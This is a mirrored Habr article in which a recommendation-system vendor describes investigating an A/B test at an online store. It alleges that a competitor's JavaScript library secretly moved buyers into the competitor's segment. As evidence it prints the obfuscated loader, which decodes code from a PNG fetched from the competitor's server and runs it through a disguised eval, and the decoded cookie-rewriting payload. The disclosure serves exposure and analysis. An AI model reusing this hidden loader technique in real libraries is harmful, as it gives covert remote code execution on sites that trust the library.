<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Attack on AB test: recipe 'R' + t (101) + 'es46'</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="AB testing is one of the most powerful and useful product management tools that allows you to evaluate the effectiveness of certain decisions on econo...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Attack on AB test: recipe 'R' + t (101) + 'es46'</h1><div class="post__text post__text-html js-mediator-article">  AB testing is one of the most powerful and useful product management tools that allows you to evaluate the effectiveness of certain decisions on economic indicators in the Internet business.  For five years of work, we have conducted a huge number of AB tests, and therefore we know very well how difficult it is to conduct experiments correctly and which errors are repeated all the time. <br><br>  A few months ago, one of our competitors began to do a strange thing - to offer our customers a comparison of their recommendation system with Retail Rocket through AB tests in the wager format with the obligation to pay 100,000 rubles in case of loss. <br><br>  Such stories are not uncommon for us - during the existence of the company, our system was compared to almost all existing recommender systems in Russia and abroad, and we always showed excellent results (we did not lose in performance in any test). 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The first test with Rees was not long in coming, but in the course of its implementation, we were faced with rather strange results, which resulted in serious research.  What we found in the end surprised us so much that we want to share the details of this study and bring its results to the court of the IT community and the e-commerce industry in Russia. <br><br><img src="https://habrastorage.org/web/39d/004/b65/39d004b651944d3abb4f87d956167243.jpg"><br><a name="habracut"></a><br><h3>  AB testing of recommendation systems in the online store ‚ÄúDaughters &amp; Sons‚Äù </h3><br>  For several months, the Internet shop ‚ÄúDaughters &amp; Sons‚Äù tested three recommender systems: Retail Rocket, Rees, and the company's internal system. <br><br>  The mechanics of conducting AB testing: the entire audience of the site is randomly divided into three equal parts, and each part of the audience sees its own version of the site.  Only the blocks of personal recommendations change - each segment shows blocks managed by one of the recommendation systems: <br><br><img src="https://habrastorage.org/web/73f/fec/83e/73ffec83e17d427b8a25da0b99f8bdb6.png"><br><br>  The test measures the conversion of each traffic segment, compares it with the others, and decides on the basis of which system works more efficiently. <br><br>  The audience is divided into a client using JavaScript code, all users get the ID of one of the three test segments, which is stored in the cookie and then transmitted to Google Analytics for each significant action on the site. <br><br>  <b>Test results at the time of writing an article from Google Analytics - conversion by segment</b> <br><br>  Segment A - recommendation system Daughters Sons <br>  Segment B - Rees recommendation system <br>  Segment C - Retail Rocket recommendation system <br><br><img src="https://habrastorage.org/web/e48/f8d/bd3/e48f8dbd31fe4b3f9ab6a36a25d96a1b.png"><br><br>  <i>Changes in conversion relative to indicators of the internal recommendation system of "Daughters &amp; Sons"</i> <br><br>  According to this data, segment C (Retail Rocket) loses, segment B (Rees) wins.  Separately, pay attention on May 27, on this day Retail Rocket shows the best performance - we will return to this detail later. <br><br>  During the test, the Retail Rocket engineering team conducted many internal tests, revealed several errors on the site, corrected many integration problems, and conducted a set of internal tests of various algorithms and their variations.  All these actions did not bring any noticeable changes. <br><br><h3>  Visual assessment of the quality of recommendations </h3><br>  In Retail Rocket, we have several ways to evaluate the effectiveness and quality of recommendations.  The very first of them is the so-called ‚Äúexpert assessment‚Äù (subjective visual assessment of ‚Äúadequacy‚Äù). <br><br>  Let's look at the examples of recommendations generated by the Retail Rocket and Rees systems: <br><br><img src="https://habrastorage.org/web/a21/1e8/9b7/a211e89b7b9541c1a984f26ae61375fb.png"><br><br>  For cat litter, our system recommends carrying for animals and different types of cat food, and the Rees system recommends baby food, tea, and a rectal tube for children. <br><br>  There are a lot of such examples for fairly visited products (for which statistics are quickly accumulated) (here is one of the <a href="https://docs.google.com/document/d/1emvSt1wo7plRXYtatmm1aI0r4vzF67Puhaw_FD76So0/">reports</a> on visual quality assessment), and despite the fact that expert assessment does not directly affect the numbers, it is a simple and fast way that serves as a certain indicator quality of the work of recommendation systems. <br><br><h3>  Indirect quality assessment of recommendations </h3><br>  It seemed strange to us that with such a visual component, the figures show a result not in our favor, so we spent a lot of resources on various internal research of the causes. <br><br>  First of all, we decided to explore an audience that interacts with blocks of product recommendations.  When you click the goods in the Rees recommendation blocks, the parameter is added to the URL: <br><br><img src="https://habrastorage.org/web/13d/5af/cef/13d5afcef251449192e14fe35fffc236.png"><br><br>  We added a similar parameter to the URL of products from the Retail Rocket recommendation blocks: <br><br><img src="https://habrastorage.org/web/e93/dc5/23a/e93dc523aa2342459933c503c3dd7241.png"><br><br>  And we built GA segments of users who clicked into recommendation blocks: <br><br><img src="https://habrastorage.org/web/22d/198/048/22d198048a6d4ab6be9737f15fe1dc3e.png"><br><br>  The first hypothesis was that our system guesses users' preferences worse, recommends less relevant products. <br><br>  If this is the case, then our blocks should receive less clicks than Rees recommendation blocks, which is refuted by Google Analytics data - we get 2.81 times more widget clicks: <br><br><img src="https://habrastorage.org/web/9ed/6bd/11e/9ed6bd11eec842f2ac7e88aabd77ebe0.png"><br><br>  The second hypothesis that we considered: visually good recommendations distract people from buying and reduce conversion.  Those.  attract their attention, but distract from purchases and do not contribute to sales growth. <br><br>  In this case, those who clicked into the recommendation blocks of Retail Rocket will be converted worse than those that are clicked into the Rees blocks.  But according to Google Analytics, this is not the case, the conversion of those clicked into Retail Rocket blocks is much higher (by 37% for 4 days): <br><br><img src="https://habrastorage.org/web/2a8/588/cc4/2a8588cc4b834130bb6a7c6beba0fd65.png"><br><br>  Thus, Retail Rocket recommends user-friendly products much more often, users click on these products more often and recommendations have a positive effect on sales. <br><br>  If there are no problems with those who interact with the recommendations, and from the visual side the recommendations look relevant, it remains to look at those who do not click on the recommendations. <br><br><h3>  Online store audience research </h3><br>  Starting to explore this segment of the audience, we noticed two interesting facts: <br><br><ol><li>  In the Rees segment, there are several percent more users than in other segments, although the settings of the AB test assume a uniform distribution of the audience between the recommender systems. </li><li>  In the Rees segment, the audience is more loyal, there are much more visitors who come to the site again. </li></ol><br><br><img src="https://habrastorage.org/web/3c8/e0c/0fc/3c8e0c0fcffe4db08510ce26c54daae7.png"><br><br>  To check the correctness of the work of splitting the online store into segments, we independently tested the segmenter using the code that the site used: in parallel with the main division, we started the segmentation of the same audience - the error was minimal: <br><br><ul><li>  Segment 1: 63215 users </li><li>  Segment 2: 63500 users </li><li>  Segment 3: 63686 users </li></ul><br>  This means that the segmenter is working correctly and errors of several percent cannot be, i.e.  Traffic distribution in the framework of the AB-test ‚ÄúDaughters &amp; Sons‚Äù contains an anomaly. <br><br>  Our developers studied the site code in detail for JS errors and bugs that could affect the segmentation, and did not find anything that could cause an anomaly. <br><br>  The logical assumption was the idea that users could somehow move between segments.  In our practice, there were cases when users changed the segment inside the test, for example, because of an incorrectly set cookie lifetime (in one of the cook stores where the identifier of the AB-test segment was stored, it lived only for two weeks, and if the user returned after this time, he was assigned a random value - ie, the user could get into another segment of the test).  To avoid such situations, we have developed a checklist, in which there is a clause on the need to ensure that the user does not change the segment during the test. <br><br>  To track such situations, Google Analytics has a ‚ÄúSequence‚Äù tool that allows you to select users who were first in one segment and then moved to another.  For the analysis, we built several such segments in Google Analytics: <br><br><img src="https://habrastorage.org/web/6ed/cee/f8c/6edceef8c0e0469a9f37c633384d05f0.png"><br><br>  And as a result we received the following figures: <br><br><img src="https://habrastorage.org/web/bbd/21a/b8a/bbd21ab8ad1344a581f657e00eb93aef.png"><br><br>  From these data it is clearly seen that anomalously many users move from the rest to the Rees segment.  And this is definitely not a bug, otherwise users would move between all segments evenly. <br><br>  The second conclusion: these users make many orders. <br><br>  <i>* Online store confirmed that these are real orders (almost all of them have the status of "purchased")</i> <br><br>  By order numbers of users moved to the Rees segment, we examined our internal session logs and identified the following patterns: <br><br><ol><li>  Almost all users moved to the Rees segment have goods added to the cart (i.e. this is a more loyal / conversion audience); </li><li>  User movements are unevenly distributed across the clock, indicating that it is manually initiated; </li><li>  Moving users to the Rees segment occurs on those days when Retail Rocket begins to win in the AB test: </li></ol><br><img src="https://habrastorage.org/web/b90/953/f55/b90953f55d14406889420bdf2c12236a.png"><br><br>  <i>Moving users to the Rees segment (clock top, days left)</i> <br><br><img src="https://habrastorage.org/web/6b7/ec9/90a/6b7ec990ad0247099b625ac35bffc603.png"><br><br>  <i>Moving users to the Retail Rocket segment (top clock, days left)</i> <br><br>  The table shows that on May 25 and 26 there are almost no movements, and on May 27, when the Retail Rocket system starts to go into a plus, the movements start again.  And again, users are moving, who add goods to the cart and will soon be converted into buyers. <br><br><h3>  Examination of the code that works on the site </h3><br>  Since the movement of loyal users to the Rees semen looked suspicious, we began to look for the reason for changing the user segment and examine the code.  We carefully investigated who and how works with the cookies, couldn‚Äôt anyone accidentally do something to make such mistakes, and we didn‚Äôt find anything suspicious. <br><br>  There were two options: either the cookie is changed by the server of the Daughters Son's store and this is not visible on the client, or by the dynamic code that comes from the server upon some request. <br><br>  Checking the dynamic code, we were looking for, among other things, the eval function - a special javascript function that can execute any text, for example, sent from the server, like JavaScript code, which in unfair hands can hide the functionality of the code, but at the same time gives full access to the whole environment site. <br><br>  During the test, we came across a strange piece of code in the JS Rees library: <br><br><img src="https://habrastorage.org/web/c8a/b7b/c75/c8ab7bc7511742959dd26010c0336396.png"><br><div class="spoiler">  <b class="spoiler_title">A piece of code from the Rees JS library</b> <div class="spoiler_text"><pre><code class="javascript hljs">key: <span class="hljs-string"><span class="hljs-string">"markDMP"</span></span>, <span class="hljs-attr"><span class="hljs-attr">value</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>.fromCharCode(e) }; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e.hasOwnProperty(i)) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-regexp"><span class="hljs-regexp">/\x61\x70\x69\x2E\x72\x65\x65\x73\x34\x36\x2E\x63\x6F\x6D/</span></span>.test(e) }(e[i])) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"canvas"</span></span>) , o = <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> , s = t(<span class="hljs-number"><span class="hljs-number">67</span></span>) , a = t(<span class="hljs-number"><span class="hljs-number">68</span></span>) , u = l.default.get(s.toLowerCase() + <span class="hljs-string"><span class="hljs-string">"ity"</span></span>) || l.default.get(t(<span class="hljs-number"><span class="hljs-number">71</span></span>) + <span class="hljs-string"><span class="hljs-string">"EO_"</span></span> + a + <span class="hljs-string"><span class="hljs-string">"ELIVERY_"</span></span> + s + <span class="hljs-string"><span class="hljs-string">"ITY_I"</span></span> + a) , c = [s + <span class="hljs-string"><span class="hljs-string">"UR"</span></span>, s + <span class="hljs-string"><span class="hljs-string">"ITY"</span></span>, s + <span class="hljs-string"><span class="hljs-string">"ODE"</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (n &amp;&amp; n.getContext &amp;&amp; u &amp;&amp; !<span class="hljs-number"><span class="hljs-number">1</span></span> === g.default.isDebug()) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-regexp"><span class="hljs-regexp">/^a:/</span></span>.test(u)) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> h = r.unserialize(u); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!h || <span class="hljs-number"><span class="hljs-number">464</span></span> === h[c.join(<span class="hljs-string"><span class="hljs-string">"_"</span></span>)]) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"continue"</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-number"><span class="hljs-number">3784</span></span> === u || <span class="hljs-number"><span class="hljs-number">3577</span></span> === u) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"continue"</span></span>; o = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Image, o.crossOrigin = <span class="hljs-string"><span class="hljs-string">"use-credentials"</span></span>, o.onload = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, r</span></span></span><span class="hljs-function">) </span></span>{ r.width = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.naturalWidth, r.height = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.naturalHeight; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = r.getContext(<span class="hljs-string"><span class="hljs-string">"2d"</span></span>); i.drawImage(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = i.getImageData(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.naturalWidth, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.naturalHeight) , o = n.data , s = <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> , a = <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> , u = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (s = <span class="hljs-number"><span class="hljs-number">0</span></span>, a = o.length; s &lt; a; s++) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(s % <span class="hljs-number"><span class="hljs-number">4</span></span> == <span class="hljs-number"><span class="hljs-number">3</span></span> &amp;&amp; s &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-number"><span class="hljs-number">0</span></span> === o[s]) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; u += <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>.fromCharCode(~-e) }(o[s]) } <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>[t(<span class="hljs-number"><span class="hljs-number">101</span></span>) + <span class="hljs-string"><span class="hljs-string">"val"</span></span>](u) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } .bind(o, t, n), o.src = e[i] } }(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-string"><span class="hljs-string">"continue"</span></span> === n) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"img"</span></span>); o.src = e[i], o.style.width = <span class="hljs-number"><span class="hljs-number">0</span></span>, o.style.height = <span class="hljs-number"><span class="hljs-number">0</span></span>, o.style.display = <span class="hljs-string"><span class="hljs-string">"none"</span></span>, o.style.position = <span class="hljs-string"><span class="hljs-string">"absolute"</span></span>, o.style.left = <span class="hljs-string"><span class="hljs-string">"-9999px"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body.appendChild(o) } } }</code> </pre> <br><br></div></div><br><br>  All code is available by <a href="https://gist.github.com/Chizh/26ed61c3ec9fb527fa29a7c75ca5e2ae">reference</a> .  The peculiarity of this piece of code is that it is clearly trying to hide its functionality. <br><br>  Several conclusions can be drawn from the code: <br><br><ul><li>  This code snippet is written specifically for the Store ‚ÄúDaughters and Sons‚Äù store, because it secretly uses a cookie under the name ‚Äúcity‚Äù belonging to the store (the store stores in it the identifier of the user's region) </li><li>  The code is intentionally written so as to make it harder to read and understand (instead of text, numeric letter identifiers are used) </li><li>  The functionality of the code is specifically hidden from external developers - the code does not work when the browser is open and for visitors to the website from Moscow (the online store should know what it integrates into its website, and which line of code is responsible for what, and here it is intentional concealment) </li><li>  The code is designed to download a picture from the Rees server, decode text from this picture, and transfer the text to the input to the naively hidden eval function (window [t (101) + ‚Äúval‚Äù] (u)) </li><li>  All this indicates the ability to covertly execute any code from the Rees side. </li></ul><br><br><img src="https://habrastorage.org/web/4a2/90e/b64/4a290eb64818434eb9ee925b7574feb2.png"><br><br>  We assume that once this information is published, Rees will delete this code, so we saved it using two external independent services: <a href="https://web.archive.org/web/20170528144028/">https://web.archive.org</a> and <a href="https://www.runscope.com/public/b7854dd4-5e80-41db-b222-3b7ce98da24a/1d80a76b-9532-48cd-9667-c13d880ed441">https://www.runscope.com</a> <br><br>  Its formatted version is available for research by <a href="https://gist.github.com/Chizh/26ed61c3ec9fb527fa29a7c75ca5e2ae">reference</a> . <br><br>  To understand what exactly this fragment does, we wrote a module that emulates user actions and logs all requests towards the Rees server.  On May 25 and 26, nothing happened (this is also seen from the table with data on the hourly movement of users towards Rees), and on May 27, when, according to Google Analytics, the Retail Rocket system went out on the AB test, around 7 pm Moscow time began moving users to the Rees segment. <br><br><img src="https://habrastorage.org/web/ff0/75d/fb5/ff075dfb5a9a47b2985c4194d764c8c7.png"><br><br>  <i>Moving users to the Rees segment (clock top, days left)</i> <br><br>  At the same time, we fixed requests towards the Rees server for a <a href="">picture</a> in PNG format (the contents of the picture can be viewed at the <a href="https://www.runscope.com/public/b7854dd4-5e80-41db-b222-3b7ce98da24a/3b59f79d-4e6d-4f77-8e4b-fd0dfd0f2deb">link</a> ).  Just like that, the picture is not available (error 404 is returned), but when the request is sent to the picture of the session of the user Rees, the picture is available for download: <br><br><img src="https://habrastorage.org/web/735/730/847/735730847d9e4e7481e453cdfffa2d69.png"><br><br>  If we transfer the image to the code input that the code was attempted to encode / hide, for convenience we rendered it <a href="https://gist.github.com/Chizh/4472f30a4858819f27db98fdf8d1017f">separately</a> , we get the following JS, which changes the value of the cookie, where the user segment of the AB test is stored: <br><br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.cookie=<span class="hljs-string"><span class="hljs-string">"rr-VisitorSegment_Rec=3:2; domain=.dochkisinochki.ru; path=/; expires=Mon, 25 Sep 2017 10:15:20 +0000"</span></span>;<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.cookie=<span class="hljs-string"><span class="hljs-string">"DS_SM_rrSegmentRecommendedABC=B; domain=.dochkisinochki.ru; path=/</span></span></code> </pre> <br>  This code explicitly changes the two cookies belonging to the store, in which the user's segment is stored, to the value of a segment equal to the Rees segment. <br><br>  We are sure that Rees will hide all traces of this attack, so the image is also saved by a request from an independent third-party <a href="https://www.runscope.com/public/b7854dd4-5e80-41db-b222-3b7ce98da24a/3b59f79d-4e6d-4f77-8e4b-fd0dfd0f2deb">service</a> . <br><br>  <b>Thus, the code of the system Rees moves to its segment of users who have added the product to the cart and are about to make an order.</b> <br><br>  According to the data received since the beginning of logging of user movements (May 1‚Äì28), built on the basis of the segment initially issued to users (that is, all those who first visited the site before May 1 are excluded from this data), Retail Rocket reliably wins the test, and Rees reduces store sales: <br><br><img src="https://habrastorage.org/web/3f7/89e/3a7/3f789e3a7a9f4bd2a3eb53031b1bdd3e.png"><br><br>  The exact window of migration of loyal online store users to the Rees segment is unknown, so the difference in efficiency is much larger. <br><br>  In addition, we see signs of other attacks on the test in the Rees code, for example, when they first visit the site, their system performs cookie matches with several RTB networks. <br><br>  Sync code: <br><br> <a href=""><img src="https://habrastorage.org/web/2df/b11/29b/2dfb1129b59c4804a77e432448eb94c2.png"></a> <br><br>  The saved request can be viewed at the link to <a href="http://api.rees46.com/init_script%3Fssid%3D%26shop_id%3Db140dced45f085919c8dd1cdd419c6%26v%3D3%26segment1%3D3%253A3%26segment2%3DC">web.archive.org</a> <br><br>  Sync requests: <br><br> <a href=""><img src="https://habrastorage.org/web/db3/19b/93e/db319b93e5054ce2b6104b193f87831f.png"></a> <br><br>  At a minimum, this allows competitors of an online store to gain access to these users, and as a maximum, to retarget traffic from its segment and divert traffic from other segments of the test to a competitor, reducing conversion. <br><br>  An interesting fact is that this attack of Rees was supported by an active PR campaign in the media and social networks: <br><br><img src="https://habrastorage.org/web/7ac/189/03c/7ac18903c7b04158b2f3b535168311f8.png"><br><br><h3>  Instead of conclusion </h3><br>  For almost 5 years of work, we are faced for the first time with similar behavior.  Unfortunately, AB tests can be performed only with absolute certainty about the decency of all its participants. <br><br>  We consider such methods of competition as unfair and unacceptable, this is detrimental to the entire community and undermines trust in established practices.  At the moment we are actively working in the legal field in order to punish the perpetrators and urge the community to share their experience in solving such situations. </div><p>Source: <a href="https://habr.com/ru/post/330012/">https://habr.com/ru/post/330012/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../330002/index.html">Analysis of tasks of the WAF Bypass contest on PHDays VII</a></li>
<li><a href="../330004/index.html">Hard Reverse or features reverse files for PowerPC architecture Big-Endian</a></li>
<li><a href="../330006/index.html">Understanding Array.prototype.reduce () and Recursion Using the Example of Apple Pie</a></li>
<li><a href="../330008/index.html">How not to give the algorithm to sell the bank</a></li>
<li><a href="../330010/index.html">HPE 3PAR StoreServ 9450</a></li>
<li><a href="../330014/index.html">NeoQUEST-2017: what awaits the guests at the jubilee "confrontation"?</a></li>
<li><a href="../330016/index.html">QEMU-KVM under LXC</a></li>
<li><a href="../330018/index.html">Writing a Babel plugin</a></li>
<li><a href="../330024/index.html">Oracle SystemTap</a></li>
<li><a href="../330026/index.html">Amazon Alexa Skill Smart Home with Open Source ioBroker Home Automation Platform</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>